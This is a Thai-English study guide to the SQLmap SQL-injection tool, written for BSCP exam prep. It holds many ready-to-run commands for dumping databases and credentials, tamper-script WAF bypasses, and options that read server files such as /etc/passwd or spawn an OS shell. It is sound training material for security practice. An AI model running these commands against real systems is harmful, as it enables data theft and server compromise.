# SQLmap — Automated SQL Injection Tool

> **เครื่องมือ automate การหาและ exploit SQL Injection**

---

## Table of Contents
1. [SQLmap คืออะไร](#sqlmap-คืออะไร)
2. [Installation](#installation)
3. [Basic Usage](#basic-usage)
4. [Important Flags](#important-flags)
5. [Request Options](#request-options)
6. [Injection Techniques](#injection-techniques)
7. [Practical Examples](#practical-examples)
8. [Useful Options](#useful-options)
9. [Tamper Scripts](#tamper-scripts)
10. [SQLmap + Burp Integration](#sqlmap--burp-integration)
11. [Quick Workflow for BSCP](#quick-workflow-for-bscp-exam)
12. [Troubleshooting](#common-issues--solutions)
13. [Cheat Sheet](#sqlmap-cheat-sheet)

---

## SQLmap คืออะไร?

**SQLmap** = เครื่องมือ automate การหา และ exploit SQL Injection

```
┌─────────────────────────────────────────────────────────────┐
│  Manual SQLi:                                               │
│  - หา injection point                                       │
│  - ลอง payload ทีละอัน                                       │
│  - หาจำนวน columns                                          │
│  - extract ทีละ table, column, data                         │
│  - ใช้เวลานาน...                                            │
├─────────────────────────────────────────────────────────────┤
│  SQLmap:                                                    │
│  - ทำทุกอย่างอัตโนมัติ                                       │
│  - ลอง payloads หลายร้อยแบบ                                  │
│  - detect database type                                     │
│  - dump ข้อมูลออกมา                                         │
│  - เร็วมาก!                                                 │
└─────────────────────────────────────────────────────────────┘
```

---

## Installation

```bash
# Kali Linux (pre-installed)
sqlmap

# Ubuntu/Debian
sudo apt install sqlmap

# macOS
brew install sqlmap

# หรือ clone จาก GitHub
git clone https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
python sqlmap.py
```

---

## Basic Usage

### Syntax พื้นฐาน

```bash
sqlmap -u "URL" [options]
```

### ตัวอย่างง่ายสุด

```bash
sqlmap -u "https://shop.com/products?category=Gifts"
```

SQLmap จะ:
1. Test parameter `category`
2. ลอง payloads หลายแบบ
3. บอกว่า vulnerable หรือไม่
4. บอก database type

---

## Important Flags

### Detection Flags

| Flag | ความหมาย | ใช้เมื่อไหร่ |
|------|---------|------------|
| `-u` | URL ที่จะ test | ทุกครั้ง |
| `-p` | Parameter ที่จะ test | เจาะจง parameter |
| `--level` | ความละเอียดในการ test (1-5) | ค่าสูง = test มากขึ้น |
| `--risk` | ความ aggressive ของ payloads (1-3) | ค่าสูง = payload รุนแรงขึ้น |
| `--dbms` | ระบุ database type | ถ้ารู้แล้วว่าเป็น DB อะไร |

### BSCP Exam Recommended

```bash
sqlmap -u "URL" --level 5 --risk 3
```

**ทำไม level 5 risk 3?**
- `--level 5` = test ทุก parameter รวมถึง headers, cookies
- `--risk 3` = ใช้ทุก payload รวมถึง OR-based (อาจแก้ไข data)

### Level Details

| Level | Tests |
|-------|-------|
| 1 | GET/POST parameters (default) |
| 2 | + Cookie values |
| 3 | + User-Agent, Referer headers |
| 4 | + More payloads |
| 5 | + Host header, all parameters |

### Risk Details

| Risk | Payloads |
|------|----------|
| 1 | Safe payloads only (default) |
| 2 | + Heavy time-based |
| 3 | + OR-based (may modify data!) |

---

### Enumeration Flags

| Flag | ความหมาย |
|------|---------|
| `--dbs` | List ทุก databases |
| `--tables` | List ทุก tables |
| `--columns` | List ทุก columns |
| `-D` | เลือก database |
| `-T` | เลือก table |
| `-C` | เลือก columns |
| `--dump` | Dump data ออกมา |
| `--dump-all` | Dump ทุกอย่าง |
| `--passwords` | Try to crack password hashes |

### ตัวอย่าง Enumeration Flow

```bash
# Step 1: List databases
sqlmap -u "URL" --dbs

# Step 2: List tables in database
sqlmap -u "URL" -D shop_db --tables

# Step 3: List columns in table
sqlmap -u "URL" -D shop_db -T users --columns

# Step 4: Dump specific columns
sqlmap -u "URL" -D shop_db -T users -C username,password --dump
```

---

## Request Options

### POST Request

```bash
# ใช้ --data สำหรับ POST body
sqlmap -u "https://shop.com/login" --data "username=admin&password=test"
```

### From Burp Request File (Recommended)

```bash
# Save request จาก Burp เป็นไฟล์
# Right-click → Copy to file → request.txt

sqlmap -r request.txt
```

**request.txt:**
```http
POST /login HTTP/1.1
Host: shop.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=abc123

username=admin&password=test
```

### Cookie Authentication

```bash
sqlmap -u "URL" --cookie "session=abc123; token=xyz"
```

### Custom Headers

```bash
sqlmap -u "URL" --headers "X-Custom: value\nAuthorization: Bearer token"
```

### JSON Body

```bash
sqlmap -u "https://api.com/login" \
  --data '{"username":"admin","password":"test"}' \
  --headers "Content-Type: application/json"
```

---

## Injection Techniques

SQLmap รองรับหลาย techniques:

| Technique | Flag | อธิบาย |
|-----------|------|--------|
| Boolean-based | `B` | True/False inference |
| Error-based | `E` | Extract via error messages |
| Union-based | `U` | UNION SELECT |
| Stacked queries | `S` | Multiple statements |
| Time-based | `T` | Response time inference |
| Inline queries | `Q` | Nested queries |

### ระบุ Technique

```bash
# ใช้เฉพาะ UNION และ Error-based
sqlmap -u "URL" --technique=UE

# ใช้ทุก technique
sqlmap -u "URL" --technique=BEUSTQ

# Boolean และ Time-based (สำหรับ Blind SQLi)
sqlmap -u "URL" --technique=BT
```

---

## Practical Examples

### Example 1: Basic GET Parameter

**Target:**
```
https://shop.com/products?category=Gifts
```

**Command:**
```bash
sqlmap -u "https://shop.com/products?category=Gifts" --level 5 --risk 3 --dbs
```

**Output:**
```
[*] starting @ 10:30:45

[10:30:45] [INFO] testing connection to the target URL
[10:30:46] [INFO] testing if the target URL content is stable
[10:30:47] [INFO] target URL content is stable
[10:30:47] [INFO] testing if GET parameter 'category' is dynamic
[10:30:48] [INFO] GET parameter 'category' appears to be dynamic
[10:30:48] [INFO] heuristic (basic) test shows that GET parameter 'category' might be injectable
[10:30:49] [INFO] testing for SQL injection on GET parameter 'category'
...
[10:31:15] [INFO] GET parameter 'category' is 'PostgreSQL' injectable
...
available databases [2]:
[*] information_schema
[*] public
```

---

### Example 2: POST Login Form

**Target:** Login form with POST data

**Save Burp request to file:**
```http
POST /login HTTP/1.1
Host: shop.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=abc123

username=admin&password=test
```

**Command:**
```bash
sqlmap -r request.txt -p username --level 5 --risk 3
```

`-p username` = test เฉพาะ parameter username

---

### Example 3: Dump Users Table

```bash
# Step 1: Confirm SQLi and get DB
sqlmap -u "https://shop.com/products?category=Gifts" --dbs --batch

# Step 2: List tables
sqlmap -u "https://shop.com/products?category=Gifts" -D public --tables --batch

# Step 3: Dump users
sqlmap -u "https://shop.com/products?category=Gifts" -D public -T users --dump --batch
```

**Output:**
```
Database: public
Table: users
[3 entries]
+----+---------------+------------------+
| id | username      | password         |
+----+---------------+------------------+
| 1  | administrator | s3cr3t_p@ssw0rd  |
| 2  | carlos        | montoya123       |
| 3  | wiener        | peter            |
+----+---------------+------------------+
```

---

### Example 4: Cookie Injection

**Target:** Cookie-based SQLi

```bash
sqlmap -u "https://shop.com/dashboard" \
  --cookie "TrackingId=abc123; session=xyz" \
  -p TrackingId \
  --level 5 --risk 3
```

---

### Example 5: Header Injection

```bash
sqlmap -u "https://shop.com/products" \
  --headers "X-Forwarded-For: 127.0.0.1" \
  -p X-Forwarded-For \
  --level 5 --risk 3
```

---

### Example 6: Specific Columns Only

```bash
# Dump only username and password
sqlmap -u "URL" -D database -T users -C username,password --dump --batch
```

---

## Useful Options (Deep Dive)

### Speed & Performance

| Flag | ความหมาย | Default | Recommended |
|------|---------|---------|-------------|
| `--threads=N` | จำนวน concurrent requests | 1 | 5-10 |
| `--time-sec=N` | Time-based delay (วินาที) | 5 | 5-10 |
| `--timeout=N` | Connection timeout (วินาที) | 30 | 30-60 |
| `--retries=N` | จำนวนครั้งที่ retry | 3 | 3-5 |

```bash
# Fast scan
sqlmap -u "URL" --threads=10 --batch

# Slow/Careful scan (avoid detection)
sqlmap -u "URL" --threads=1 --delay=2 --timeout=60
```

**Thread Warning:**
```
⚠️ --threads > 1 ใช้ได้เฉพาะ Boolean/Time-based blind
⚠️ UNION attack ใช้ thread เดียวเท่านั้น
```

---

### Output & Logging

| Flag | ความหมาย |
|------|---------|
| `-v N` | Verbosity level (0-6) |
| `--batch` | Auto-answer all questions (default: Y) |
| `--output-dir=/path` | Custom output directory |
| `--flush-session` | Clear cached session data |
| `-s FILE` | Load session from file |
| `-t FILE` | Log all HTTP traffic to file |
| `--save=FILE` | Save options to config file |

#### Verbosity Levels

| Level | แสดงอะไร |
|-------|---------|
| `0` | แสดงเฉพาะ errors |
| `1` | + Info messages (default) |
| `2` | + Debug messages |
| `3` | + Payloads used |
| `4` | + HTTP requests |
| `5` | + HTTP responses headers |
| `6` | + HTTP responses body |

```bash
# Debug mode - ดู payloads
sqlmap -u "URL" -v 3

# Full debug - ดู requests/responses
sqlmap -u "URL" -v 4

# Save HTTP traffic for analysis
sqlmap -u "URL" -t traffic.log
```

---

### Bypass & Evasion

| Flag | ความหมาย |
|------|---------|
| `--tamper=script` | ใช้ tamper script(s) |
| `--random-agent` | สุ่ม User-Agent ทุก request |
| `--mobile` | ใช้ mobile User-Agent |
| `--delay=N` | Delay N วินาทีระหว่าง requests |
| `--safe-url=URL` | เข้า URL นี้ระหว่างการ test |
| `--safe-freq=N` | เข้า safe-url ทุก N requests |
| `--skip-waf` | ข้าม WAF detection |
| `--hpp` | ใช้ HTTP Parameter Pollution |

```bash
# Basic evasion
sqlmap -u "URL" --random-agent --delay=1

# Heavy evasion
sqlmap -u "URL" \
  --tamper=space2comment,randomcase \
  --random-agent \
  --delay=2 \
  --safe-url="https://target.com/" \
  --safe-freq=10

# HPP bypass
sqlmap -u "URL?id=1" --hpp
# จะส่ง: ?id=1&id=PAYLOAD
```

---

### Prefix & Suffix

เมื่อรู้ว่า injection point ต้องการ specific prefix/suffix:

```bash
# Basic
sqlmap -u "URL" --prefix="'" --suffix="-- -"

# Double quote context
sqlmap -u "URL" --prefix='"' --suffix='"-- -'

# Closing parenthesis
sqlmap -u "URL" --prefix="')" --suffix="-- -"

# Multiple parentheses
sqlmap -u "URL" --prefix="'))" --suffix="-- -"
```

**ตัวอย่าง:**
```sql
-- Original query:
SELECT * FROM users WHERE id = ('INPUT')

-- ต้องใช้:
--prefix="')" --suffix="-- -"

-- Payload จะกลายเป็น:
SELECT * FROM users WHERE id = ('') OR 1=1-- -')
```

---

### Second-Order Injection

เมื่อ inject ที่หนึ่ง แต่ trigger ที่อื่น:

```bash
sqlmap -u "https://target.com/register" \
  --data "username=PAYLOAD&password=test" \
  --second-url="https://target.com/profile" \
  --second-req=profile_request.txt
```

---

### OS & File Access (Advanced)

| Flag | ความหมาย |
|------|---------|
| `--os-shell` | Spawn interactive OS shell |
| `--os-cmd=CMD` | Execute OS command |
| `--file-read=/path` | Read file from server |
| `--file-write=local` | Write file to server |
| `--file-dest=/path` | Destination path for write |

```bash
# Read /etc/passwd (if DB user has FILE privilege)
sqlmap -u "URL" --file-read="/etc/passwd"

# Get OS shell
sqlmap -u "URL" --os-shell

# Execute command
sqlmap -u "URL" --os-cmd="whoami"
```

**Warning:**
```
⚠️ ต้องมี FILE privilege ใน database
⚠️ Stacked queries ต้อง support
⚠️ ใช้ได้เฉพาะบาง DB (MySQL, MSSQL)
```

---

### Database-Specific Options

```bash
# Specify database type (skip detection)
sqlmap -u "URL" --dbms=mysql
sqlmap -u "URL" --dbms=postgresql
sqlmap -u "URL" --dbms=mssql
sqlmap -u "URL" --dbms=oracle

# Check if DBA
sqlmap -u "URL" --is-dba

# Get current user
sqlmap -u "URL" --current-user

# Get current database
sqlmap -u "URL" --current-db

# Get hostname
sqlmap -u "URL" --hostname

# Get all users
sqlmap -u "URL" --users

# Get user passwords
sqlmap -u "URL" --passwords

# Get user privileges
sqlmap -u "URL" --privileges
```

---

## Tamper Scripts (Deep Dive)

**Tamper scripts** = Python scripts ที่แก้ไข payload ก่อนส่ง

### How Tamper Works

```
Original Payload: ' OR 1=1--
       ↓
Tamper Script: space2comment
       ↓
Modified Payload: '/**/OR/**/1=1--
       ↓
Sent to Target
```

### List & Use Tamper Scripts

```bash
# List all tamper scripts (100+ scripts)
sqlmap --list-tampers

# ใช้ tamper script เดียว
sqlmap -u "URL" --tamper=space2comment

# ใช้หลาย scripts (chain)
sqlmap -u "URL" --tamper=space2comment,between,randomcase

# ใช้กับ Burp proxy ดู payload
sqlmap -u "URL" --tamper=space2comment --proxy=http://127.0.0.1:8080 -v 3
```

---

### Tamper Scripts by Category

#### Space Bypass (แทน space)

| Script | Input | Output | Target |
|--------|-------|--------|--------|
| `space2comment` | `a b` | `a/**/b` | Most DBs |
| `space2plus` | `a b` | `a+b` | URL context |
| `space2dash` | `a b` | `a--\nb` | MySQL |
| `space2hash` | `a b` | `a#\nb` | MySQL |
| `space2mssqlblank` | `a b` | `a%00b` | MSSQL |
| `space2mssqlhash` | `a b` | `a%23\nb` | MSSQL |
| `space2randomblank` | `a b` | `a%0Db` | Random blank |
| `space2morehash` | `a b` | `a#randomtext\nb` | MySQL |

```bash
# ถ้า space ถูก block
sqlmap -u "URL" --tamper=space2comment
```

---

#### Encoding & Obfuscation

| Script | Input | Output | Target |
|--------|-------|--------|--------|
| `charencode` | `SELECT` | `%53%45%4C%45%43%54` | URL encode |
| `chardoubleencode` | `SELECT` | `%2553%2545%254C...` | Double URL encode |
| `charunicodeencode` | `SELECT` | `%u0053%u0045%u004C...` | Unicode encode |
| `base64encode` | `SELECT` | `U0VMRUNU` | Base64 |
| `htmlencode` | `<>` | `&lt;&gt;` | HTML entities |
| `percentage` | `SELECT` | `%S%E%L%E%C%T` | IIS/ASP |
| `apostrophemask` | `'` | `%EF%BC%87` | UTF-8 fullwidth |
| `apostrophenullencode` | `'` | `%00%27` | NULL + quote |

```bash
# Double URL encoding
sqlmap -u "URL" --tamper=chardoubleencode

# Unicode bypass
sqlmap -u "URL" --tamper=charunicodeencode
```

---

#### Case Manipulation

| Script | Input | Output |
|--------|-------|--------|
| `randomcase` | `SELECT` | `SeLeCt` |
| `lowercase` | `SELECT` | `select` |
| `uppercase` | `select` | `SELECT` |

```bash
# Case-insensitive WAF bypass
sqlmap -u "URL" --tamper=randomcase
```

---

#### Keyword Bypass

| Script | Input | Output | Target |
|--------|-------|--------|--------|
| `between` | `a>b` | `a NOT BETWEEN 0 AND b` | `>` blocked |
| `equaltolike` | `a=b` | `a LIKE b` | `=` blocked |
| `greatest` | `a>b` | `GREATEST(a,b+1)=a` | `>` blocked |
| `ifnull2ifisnull` | `IFNULL(a,b)` | `IF(ISNULL(a),b,a)` | IFNULL blocked |
| `modsecurityversioned` | `1 AND 2>1` | `1 /*!30874AND 2>1*/` | ModSecurity |
| `modsecurityzeroversioned` | `1 AND 2>1` | `1 /*!00000AND 2>1*/` | ModSecurity |
| `symboliclogical` | `AND` | `&&` | AND/OR blocked |
| `versionedkeywords` | `UNION` | `/*!UNION*/` | MySQL keywords |
| `versionedmorekeywords` | `UNION SELECT` | `/*!UNION*/ /*!SELECT*/` | MySQL |

```bash
# AND/OR blocked
sqlmap -u "URL" --tamper=symboliclogical

# ModSecurity bypass
sqlmap -u "URL" --tamper=modsecurityversioned
```

---

#### Comment Injection

| Script | Input | Output |
|--------|-------|--------|
| `commentbeforeparentheses` | `func()` | `func/**/()` |
| `halfversionedmorekeywords` | `UNION` | `/*!0UNION` |
| `informationschemacomment` | `information_schema.tables` | `information_schema/**/.tables` |

---

#### Concatenation & Split

| Script | Input | Output | Target |
|--------|-------|--------|--------|
| `concat2concatws` | `CONCAT(a,b)` | `CONCAT_WS(MID(0,0),a,b)` | MySQL |
| `charunicodeescape` | `SELECT` | `\u0053\u0045...` | Unicode escape |
| `unionalltounion` | `UNION ALL` | `UNION` | Remove ALL |
| `unmagicquotes` | `'` | `%BF%27` | Magic quotes bypass |

---

### Database-Specific Tamper Scripts

#### MySQL

| Script | ทำอะไร |
|--------|-------|
| `space2mysqlblank` | แทน space ด้วย MySQL blank chars |
| `space2mysqldash` | ใช้ `--\n` แทน space |
| `versionedkeywords` | ครอบ keywords ด้วย `/*!*/` |
| `halfversionedmorekeywords` | `/*!0keyword` |
| `modsecurityversioned` | ModSecurity bypass |
| `concat2concatws` | แปลง CONCAT เป็น CONCAT_WS |

```bash
# MySQL WAF bypass combo
sqlmap -u "URL" --dbms=mysql --tamper=space2comment,versionedkeywords,randomcase
```

---

#### MSSQL

| Script | ทำอะไร |
|--------|-------|
| `space2mssqlblank` | ใช้ MSSQL blank chars |
| `space2mssqlhash` | ใช้ `%23\n` (hash+newline) |
| `sp_password` | Append `sp_password` ซ่อนจาก logs |

```bash
# MSSQL WAF bypass
sqlmap -u "URL" --dbms=mssql --tamper=space2mssqlblank,sp_password
```

---

#### PostgreSQL

| Script | ทำอะไร |
|--------|-------|
| `schemasplit` | Split schema.table |
| `overlongutf8` | ใช้ overlong UTF-8 |

---

### Common WAF Bypass Combinations

#### Generic WAF

```bash
sqlmap -u "URL" \
  --tamper=space2comment,randomcase,between,charencode \
  --random-agent \
  --delay=1
```

#### ModSecurity

```bash
sqlmap -u "URL" \
  --tamper=modsecurityversioned,space2comment,randomcase \
  --random-agent
```

#### Cloudflare

```bash
sqlmap -u "URL" \
  --tamper=space2comment,charencode,randomcase \
  --random-agent \
  --delay=2
```

#### AWS WAF

```bash
sqlmap -u "URL" \
  --tamper=charunicodeencode,space2comment \
  --random-agent
```

---

### Create Custom Tamper Script

```python
#!/usr/bin/env python
# mytamper.py

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def tamper(payload, **kwargs):
    """
    Custom tamper script
    """
    if payload:
        # แทน UNION ด้วย UN/**/ION
        payload = payload.replace("UNION", "UN/**/ION")
        # แทน SELECT ด้วย SEL/**/ECT
        payload = payload.replace("SELECT", "SEL/**/ECT")
    return payload
```

**ใช้:**
```bash
sqlmap -u "URL" --tamper=/path/to/mytamper.py
```

---

### Tamper Testing with Burp

```bash
# ส่ง traffic ผ่าน Burp ดู payload ที่ถูก tamper
sqlmap -u "URL" \
  --tamper=space2comment,randomcase \
  --proxy=http://127.0.0.1:8080 \
  -v 3
```

**ดูใน Burp:**
```
Original: ' UNION SELECT NULL--
Tampered: '/**/UnIoN/**/sElEcT/**/NULL--
```

---

## SQLmap + Burp Integration

### ส่ง traffic ผ่าน Burp

```bash
sqlmap -u "URL" --proxy=http://127.0.0.1:8080
```

**ประโยชน์:**
- ดู requests/responses ใน Burp
- Debug ปัญหา
- ดู payloads ที่ SQLmap ใช้
- เรียนรู้ว่า SQLmap ทำอะไร

---

## Quick Workflow for BSCP Exam

### Standard Flow

```bash
# 1. Basic test with high level/risk
sqlmap -u "https://target.com/products?category=Gifts" \
  --level 5 --risk 3 \
  --batch

# 2. ถ้า injectable, dump databases
sqlmap -u "URL" --dbs --batch

# 3. List tables
sqlmap -u "URL" -D database_name --tables --batch

# 4. Dump users
sqlmap -u "URL" -D database_name -T users --dump --batch

# 5. ถ้ามี password hash, crack
sqlmap -u "URL" -D database_name -T users --dump --passwords --batch
```

### One-Liner (Fast)

```bash
# ถ้ารู้ว่า table ชื่อ users
sqlmap -u "URL" -D public -T users -C username,password --dump --batch --threads=10
```

### From Burp Request

```bash
# Save request จาก Burp แล้วรัน
sqlmap -r request.txt --level 5 --risk 3 --dump --batch
```

---

## Common Issues & Solutions

### Issue 1: "parameter does not seem to be injectable"

**Solution:**
```bash
# เพิ่ม level และ risk
sqlmap -u "URL" --level 5 --risk 3

# ระบุ prefix/suffix
sqlmap -u "URL" --prefix="'" --suffix="--"

# ระบุ technique
sqlmap -u "URL" --technique=BT

# Flush session (ถ้าเคย test แล้ว)
sqlmap -u "URL" --flush-session
```

---

### Issue 2: WAF Blocking

**Solution:**
```bash
# ใช้ tamper scripts
sqlmap -u "URL" --tamper=space2comment,randomcase

# Random User-Agent
sqlmap -u "URL" --random-agent

# Delay between requests
sqlmap -u "URL" --delay=2

# Combine all
sqlmap -u "URL" --tamper=space2comment --random-agent --delay=1
```

---

### Issue 3: Connection Timeout

**Solution:**
```bash
sqlmap -u "URL" --timeout=60 --retries=3
```

---

### Issue 4: Need Authentication

**Solution:**
```bash
# Cookie auth
sqlmap -u "URL" --cookie="session=abc123"

# Basic auth
sqlmap -u "URL" --auth-type=basic --auth-cred="user:pass"

# Bearer token
sqlmap -u "URL" --headers="Authorization: Bearer eyJ..."
```

---

### Issue 5: HTTPS Certificate Error

**Solution:**
```bash
sqlmap -u "https://URL" --force-ssl
```

---

## SQLmap Cheat Sheet

### Essential Commands

```bash
# Basic test
sqlmap -u "URL"

# Full test (BSCP recommended)
sqlmap -u "URL" --level 5 --risk 3 --batch

# POST request
sqlmap -u "URL" --data "param=value"

# From Burp file
sqlmap -r request.txt

# Specific parameter
sqlmap -u "URL" -p category

# Dump everything
sqlmap -u "URL" --dump-all --batch

# Quick dump users
sqlmap -u "URL" -D db -T users -C username,password --dump --batch
```

### Flags Summary

| Category | Flags |
|----------|-------|
| **Target** | `-u`, `-r`, `-p`, `--data` |
| **Detection** | `--level`, `--risk`, `--dbms`, `--technique` |
| **Enumeration** | `--dbs`, `--tables`, `--columns`, `--dump` |
| **Selection** | `-D`, `-T`, `-C` |
| **Performance** | `--threads`, `--batch`, `--timeout` |
| **Evasion** | `--tamper`, `--random-agent`, `--proxy`, `--delay` |
| **Auth** | `--cookie`, `--headers`, `--auth-type`, `--auth-cred` |

---

## BSCP Exam Tips

| Situation | SQLmap Command |
|-----------|---------------|
| Product filter SQLi | `sqlmap -u "URL?category=x" --level 5 --risk 3 --dump --batch` |
| Login form | `sqlmap -r request.txt -p username --dump --batch` |
| Cookie injection | `sqlmap -u "URL" --cookie "id=x" -p id --dump --batch` |
| Need credentials fast | `sqlmap -u "URL" -D db -T users -C username,password --dump --batch` |
| Slow? | Add `--threads=10` |
| WAF blocking? | Add `--tamper=space2comment --random-agent` |

### When to Use SQLmap vs Manual

| Situation | Recommendation |
|-----------|---------------|
| Simple UNION SQLi | Manual (faster) |
| Blind SQLi | SQLmap (automatic) |
| Multiple injection points | SQLmap |
| Need to dump large data | SQLmap |
| Time pressure | SQLmap with --batch |

### Exam Warning

```
⚠️ SQLmap อาจช้าในบางกรณี
⚠️ ถ้า UNION attack ง่าย ทำ manual เร็วกว่า
⚠️ ใช้ SQLmap สำหรับ Blind SQLi จะคุ้มกว่า
⚠️ --risk 3 อาจแก้ไข data ในฐานข้อมูล (ระวัง!)
```

---

## Next Steps

- [04-Blind-SQLi.md](./04-Blind-SQLi.md) — Boolean & Time-based blind injection (manual)
- [06-Exam-Scenarios.md](./06-Exam-Scenarios.md) — BSCP exam patterns
